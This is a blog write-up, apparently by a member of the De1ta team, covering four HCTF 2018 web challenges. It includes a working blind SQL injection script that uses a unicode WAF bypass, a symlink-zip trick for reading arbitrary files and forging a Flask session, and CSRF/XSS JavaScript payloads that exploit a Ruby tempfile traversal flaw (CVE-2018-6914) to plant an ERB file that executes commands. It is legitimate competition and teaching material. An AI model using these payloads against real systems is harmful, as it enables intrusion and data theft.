---
title: 2018 HCTF web WriteUp
tags:
  - CTF
  - WEB
  - WriteUp
date: 2018-11-13 14:42:59
toc: true
---

周末肝了两天HCTF，感谢队友们带飞，这里记录一下做的WEB题
顺便打个小广告：De1ta长期招 逆向/pwn/密码学/硬件/取证/杂项/etc. 选手，急招二进制和密码选手,有意向的大佬请联系ZGUxdGFAcHJvdG9ubWFpbC5jb20=

<!-- more -->

## kzone
打开发现是一个QQ钓鱼站，主页会跳转到空间
http://kzone.2018.hctf.io/www.zip 可以下载到源码
install.sql 文件中有admin密码，admin。
```sql
INSERT INTO `fish_admin` (`id`, `username`, `password`, `name`, `qq`, `per`) VALUES
(1, 'admin', '21232f297a57a5a743894a0e4a801fc3', '小杰', '1503816935', 1);
```
不过登陆不上去，密码被改了

审计源码翻到了member.php，发现这边没有addslashes，并且无需登录也可访问

![](/img/2018-hctf-5.png)

可以看到这段代码从cookie获取了登陆信息，如果符合几个if，就能登陆
想到通过注入 ，union select 替换掉admin_user和admin_pass
尝试构造弱类型绕过：
Cookie: PHPSESSID=s33h9c1u8bq5t0r8s4dura0c76; islogin=1; login_data={"admin_user":"admin'||'1","admin_pass":65}
（一开始没构造出来，然后就转思路去bypass waf了

参考这篇文章
http://blog.sina.com.cn/s/blog_1574497330102wruv.html
虽然他没绕过关键词检测，但是顺着他的思路尝试构造了
 \u0075nion，本地测试发现json_decode后变为union，成功bypass waf
构造一个sleep的cookie，放到服务端测试也sleep了，证明此处注入可行
```
Cookie:PHPSESSID=t0k91etf5fecbi4t25d7hprtm3;islogin=1;login_data={"admin_user":"admin111'/**/\u0075nion/**/select/**/1,2,3,4,5,6/**/from/**/fish_admin/**/where/**/\u0073leep(3)\u003d'1","admin_pass":"3b30a11aaba222edd6e704e9959b94643ed4ffd9"}
```

![](/img/2018-hctf-6.png)

后面就把所有关键词用这种方法绕过，就能直接注入了，最后flag在 F1444g表的F1a9字段
附上注入脚本
```python
#!/usr/bin/python
#!coding:utf-8#
# xishir
import requests
import time
import datetime

#hctf{4526a8cbd741b3f790f95ad32c2514b9}

ss = "{}_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-+"
r = requests.session()
url = "http://kzone.2018.hctf.io/admin/"
#url="http://127.0.0.1/hctf/www/admin/"

union = '\u00'+str(hex(ord('u')))[2:]+'nion'
sleep = '\u00'+str(hex(ord('s')))[2:]+'leep'
ascii = '\u00'+str(hex(ord('a')))[2:]+'scii'
ok = '\u00'+str(hex(ord('=')))[2:]
substr = '\u00'+str(hex(ord('s')))[2:]+'ubstr'
over = '\u00'+str(hex(ord('#')))[2:]
blank = "/**/"
orr = '\u00'+str(hex(ord('o')))[2:]+'r'

flag=""
for i in range(1,50):
    print i
    for j in ss:
        payload = "admin' and (substr((select binary F1a9 from F1444g limit 1),"+str(i)+",1)='"+str(j)+"') and sleep(4) and 1='1"

        payload = payload.replace('sleep',sleep)
        payload = payload.replace('union',union)
        payload = payload.replace('=',ok)
        payload = payload.replace('#',over)
        payload = payload.replace(' ',blank)
        payload = payload.replace('ascii',ascii)
        payload = payload.replace('substr',substr)
        payload = payload.replace('or',orr)

        jsons = '{"admin_user":"'+payload+'","admin_pass":"3b30a11aaba222edd6e704e9959b94643ed4ffd9"}'

        cookie={"PHPSESSID":"t0k91etf5fecbi4t25d7hprtm3",
        "islogin":"1",
        "login_data":jsons}

        t1=time.time()
        r1 = r.get("http://kzone.2018.hctf.io",cookies=cookie)
        t2=time.time()
        #print t2
        if (t2-t1)>4:
            #print "aaaaaaaa"
            flag+=str(j)
            print i,flag
            break

```

![](/img/2018-hctf-7.png)


## admin
找到源码   https://github.com/woadsl1234/hctf_flask/
![](/img/2018-hctf-8.png)

![](/img/2018-hctf-10.png)
看到strlower函数很奇怪
参考：http://blog.lnyas.xyz/?p=1411
最后解题步骤如下
1. 注册一个ᴬdmin账号
2. 登陆ᴬdmin，发现页面显示Admin
3. 修改密码，退出登录
4. 重新登陆Admin，看到flag
![](/img/2018-hctf-11.png)


## hide and seek
传个zip，会解压缩并且读取
尝试传个链接文件ln -s /etc/passwd test 并压缩上传
读到/etc/passwd

然后就是各种文件读取
在 /proc/self/environ读取到一个好东西

```
UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=323a960bcc1aSHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.13.12-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.13.12.0.2.0-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.6NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0
```


然后直接读/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini文件得到

```
[uwsgi] module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable=app
```

按部就班读取项目文件 /app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py
得到
```python
# -*- coding: utf-8 -*-
from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
import uuid
import base64
import random
import flag
from werkzeug.utils import secure_filename
import os
random.seed(uuid.getnode())
app = Flask(__name__)
app.config['SECRET_KEY'] = str(random.random()*100)
app.config['UPLOAD_FOLDER'] = './uploads'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024
ALLOWED_EXTENSIONS = set(['zip'])

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS


@app.route('/', methods=['GET'])
def index():
    error = request.args.get('error', '')
    if(error == '1'):
        session.pop('username', None)
        return render_template('index.html', forbidden=1)

    if 'username' in session:
        return render_template('index.html', user=session['username'], flag=flag.flag)
    else:
        return render_template('index.html')


@app.route('/login', methods=['POST'])
def login():
    username=request.form['username']
    password=request.form['password']
    if request.method == 'POST' and username != '' and password != '':
        if(username == 'admin'):
            return redirect(url_for('index',error=1))
        session['username'] = username
    return redirect(url_for('index'))


@app.route('/logout', methods=['GET'])
def logout():
    session.pop('username', None)
    return redirect(url_for('index'))

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'the_file' not in request.files:
        return redirect(url_for('index'))
    file = request.files['the_file']
    if file.filename == '':
        return redirect(url_for('index'))
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        if(os.path.exists(file_save_path)):
            return 'This file already exists'
        file.save(file_save_path)
    else:
        return 'This file is not a zipfile'
try:
        extract_path = file_save_path + '_'
        os.system('unzip -n ' + file_save_path + ' -d '+ extract_path)
        read_obj = os.popen('cat ' + extract_path + '/*')
        file = read_obj.read()
        read_obj.close()
        os.system('rm -rf ' + extract_path)
    except Exception as e:
        file = None

    os.remove(file_save_path)
    if(file != None):
        if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1):
            return redirect(url_for('index', error=1))
    return Response(file)


if __name__ == '__main__':
    #app.run(debug=True)
    app.run(host='127.0.0.1', debug=True, port=10008)

```

因为有这段
```python
 if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1):
            return redirect(url_for('index', error=1))
```
如果文件里有hctf就返回主页
所以不能直接读flag.py，也没有flag.pyc
后面读index.html发现admin用户登录就能看到flag
```
  {% if user == 'admin' %}
        Your flag: <br>
        {{ flag  }}

```
想到要读secret，伪造admin的session，发现代码里的secret是伪随机的
```python
random.seed(uuid.getnode())
app = Flask(__name__)
app.config['SECRET_KEY'] = str(random.random()*100)
```
随机数种子固定为mac地址，读取 /sys/class/net/eth0/address 可以得到
然后带入seed，本地跑一下，登陆admin拿到cookie，再放到网站上就能看到flag了
![](/img/2018-hctf-12.png)


## share
打开题目，主页翻译一下可以得到这些信息

![](/img/2018-hctf-1.png)
是个让用户分享应用的网站，并且管理员可以把应用推给某个用户

/Alphatest可以看到一个filenumber 和自己的uid

![](/img/2018-hctf-2.png)

/share 可以分享东西给管理员，猜测存在xss，context框传了个段xss代码，发现能接收到admin的请求，bot是PhantomJS/2.1.1，说明能执行js，但是开了httponly打不到cookie，猜测是要CSRF，url框传的东西好像没啥用

![](/img/2018-hctf-3.png)

根据主页提示可能有源码泄漏，在robots.txt 看到了三个接口的代码

``` ruby
/* this terrible code */
class FileController < ApplicationController
  before_action :authenticate_user!
  before_action :authenticate_role
  before_action :authenticate_admin
  protect_from_forgery :except => [:upload , :share_people_test]

# post /file/upload
  def upload
    if(params[:file][:myfile] != nil && params[:file][:myfile] != "")
      file = params[:file][:myfile]
      name = Base64.decode64(file.original_filename)
      ext = name.split('.')[-1]
      if ext == name || ext ==nil
        ext=""
      end
      share = Tempfile.new(name.split('.'+ext)[0],Rails.root.to_s+"/public/upload")
      share.write(Base64.decode64(file.read))
      share.close
      File.rename(share.path,share.path+"."+ext)
      tmp = Sharefile.new
      tmp.public = 0
      tmp.path = share.path
      tmp.name = name
      tmp.tempname= share.path.split('/')[-1]+"."+ext
      tmp.context = params[:file][:context]
      tmp.save
    end
    redirect_to root_path
  end

# post /file/Alpha_test
  def Alpha_test
    if(params[:fid] != "" && params[:uid] != "" && params[:fid] != nil && params[:uid] != nil)
      fid = params[:fid].to_i
      uid = params[:uid].to_i
      if(fid > 0 && uid > 0)
        if(Sharelist.find_by(sharefile_id: fid)==nil)
          if(Sharelist.count("user_id = ?", uid.to_s) <5)
            share = Sharelist.new
            share.sharefile_id = fid
            share.user_id = uid
            share.save
          end
        end
      end
    end
    redirect_to(root_path)
  end

  def share_file_to_all
    file = Sharefile.find(params[:fid])
    File.rename(file.path,Rails.root+"/public/download/"+file.name)
    file.public = true
    file.path = Rails.root+"/public/download/"+file.name
    file.save
  end

end
```

分析一下这段代码，
```
before_action :authenticate_user!
before_action :authenticate_role
before_action :authenticate_admin
```
首先三个接口都是管理员才能调用

第一个接口/file/upload 能够上传文件
第二个接口/file/Alpha_test 能够分配一个文件给一个用户
第三个是把文件公开，但是没有提供外部调用路由

后面 hint1给了文件结构
```
views
|-- devise
|   |-- confirmations
|   |-- mailer
|   |-- passwords
|   |-- registrations
|   |   `-- new.html.erb
|   |-- sessions
|   |   `-- new.html.erb
|   |-- shared
|   `-- unlocks
|-- file
|-- home
|   |-- Alphatest.erb
|   |-- addtest.erb
|   |-- home.erb
|   |-- index.html.erb
|   |-- publiclist.erb
|   |-- share.erb
|   `-- upload.erb
|-- layouts
|   |-- application.html.erb
|   |-- mailer.html.erb
|   `-- mailer.text.erb
`-- recommend
     `-- show.erb
```

hint2给了一个主页的代码
`<%= render template: "home/"+params[:page] %>`
参考[这篇文章](http://blog.neargle.com/SecNewsBak/drops/Ruby%20on%20Rails%20%E5%8A%A8%E6%80%81%E6%B8%B2%E6%9F%93%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28CVE.html)
尝试跨目录包含文件失败，应该是只能包含home目录下的文件

hint3给了ruby版本2.5.0
通过查找ruby版本号，结合robots代码，主页代码和目录结构，可以确定要利用的是这个CVE：
CVE-2018-6914: Unintentional file and directory creation with directory traversal in tempfile and tmpdir
大概意思就是在Tempfile 创建文件时如果传入(../)就能创建任意目录或文件
想到可以传个文件到home下，结合主页的文件包含，即可RCE

整个思路就很清晰了：
1. CSRF 让admin调用/file/upload 接口上传带有恶意文件名的文件
2. Tmpfile漏洞使得文件生成在/views/home/目录下，但是新生成的文件名有部分是随机的
3. CSRF 调用/file/Alpha_test 接口把文件分配到自己的id下，在/Alphatest拿到生成的文件名
4. 主页文件包含，RCE

于是开始了艰难的构造payload
最后上传的payload如下：
```html
<script type="text/javascript" charset="utf-8" src="http://code.jquery.com/jquery-1.11.1.min.js"></script>
<script>
function upload(i) {
var test=$('meta').eq(1).attr("content");
var url="/file/upload";
  var data="-----------------------------13025814701038468772945051835\x0d\x0a\
Content-Disposition: form-data; name=\"file[myfile]\"; filename=\"Li4vLi4vYXBwL3ZpZXdzL2hvbWUvZGUxdGF4aXNoaXIuZXJic3MuZXJi\"\x0d\x0a\
Content-Type: application/text\x0d\x0a\
\x0d\x0a\
PCU9IGBjYXQgL2ZsYWdgICU+\x0d\x0a\
-----------------------------13025814701038468772945051835\x0d\x0a\
Content-Disposition: form-data; name=\"file[context]\"\x0d\x0a\
\x0d\x0a\
de1ta\x0d\x0a\
-----------------------------13025814701038468772945051835\x0d\x0a\
Content-Disposition: form-data; name=\"authenticity_token\"\x0d\x0a\
\x0d\x0a\
"+test+"\x0d\x0a\
-----------------------------13025814701038468772945051835\x0d\x0a\
Content-Disposition: form-data; name=\"commit\"\x0d\x0a\
\x0d\x0a\
submit\x0d\x0a\
-----------------------------13025814701038468772945051835\x0d\x0a\
Content-Disposition: form-data; name=\"utf8\"\x0d\x0a\
\x0d\x0a\
✓\x0d\x0a\
-----------------------------13025814701038468772945051835--";
  $.ajax({
   url: url,
   type:"POST",
   headers: {
       "Content-Type": "multipart/form-data; boundary=---------------------------13025814701038468772945051835",
       "Upgrade-Insecure-Requests":"1"
   },
   data:data,
   contentType:false,
   success:function(res){
   },
   error:function(err){
   }
  })
 }
 for(var i=1;i<2;i++)
 {
    upload(i);
 }
</script>
```
文件内容为
```
<%= `cat /flag` %>
```
文件名为
```
../../app/views/home/de1taxishir.erbss.erb
```

推送文件到我的uid下的代码为：
```html
<script type="text/javascript" charset="utf-8" src="http://code.jquery.com/jquery-1.11.1.min.js"></script>
<script>
function go(fffid){
  var test=$('meta').eq(1).attr("content");
  console.log(test);
  var params = {utf8:"\xE2\x9C\x93",authenticity_token:test,uid:2,fid:fffid,commit:"submit"};
  var url = '/file/Alpha_test';
$.ajax({
   url : url,
   type : "POST",
   data : params,
   success : function(result) {
   },
   error:function(result){
   }
 })
}

for(var i=1;i<20;i+=1){
  go(i);
}
</script>
```
这里因为不知道文件id是多少，只能根据前面的filenumber来爆破一下，所以写了个for循环
最后上传上去并获取文件名后，在主页进行文件包含执行命令，读取flag

![](/img/2018-hctf-4.png)

ps：这道题有个搅💩bug，利用推文件给用户接口，无限暴力推fid到自己的uid下，就能看到别人上传的文件，并且别人就不知道他的文件名是啥了

还有就是js构造一个文件上传太坑了，一开始用new File，一直失败，后面发现是PhantomJS不支持这个h5的类好像，于是硬生生写了个multipart/form-data 出来

>flag:hctf{8f4c57063ddb7b106e03e25f7d1bb813}


## 后记
还是学到了很多知识，尤其是share这道题，最后给杭电的出题和运维师傅们递茶，给队友们递茶！
